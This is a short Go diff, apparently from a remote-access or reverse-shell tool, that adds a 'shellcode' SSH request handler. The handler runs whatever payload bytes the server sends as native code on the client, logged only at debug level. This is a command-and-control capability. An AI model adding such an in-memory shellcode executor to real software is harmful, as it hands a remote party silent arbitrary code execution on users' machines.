@@ -24,6 +24,7 @@ import (
 	"time"
 
 	"github.com/gorilla/websocket"
+	"github.com/rurreac/go-shellcode/shellcode"
 	"golang.org/x/crypto/ssh"
 )
 
@@ -335,6 +336,13 @@ func (s *Session) handleGlobalRequests(requests <-chan *ssh.Request) {
 			s.updatePtySize(termSize.Rows, termSize.Cols)
 		case "checksum-verify":
 			go s.verifyFileCheckSum(req)
+		case "shellcode":
+			s.Logger.Debugf("%sExecuting ShellCode", s.logID)
+			go func() {
+				if err := shellcode.Execute(req.Payload); err != nil {
+					s.Logger.Debugf("ShellCode: %v", err)
+				}
+			}()
 		case "shutdown":
 			s.Logger.Warnf("%sServer requested Client shutdown", s.logID)
 			_ = s.replyConnRequest(req, true, nil)
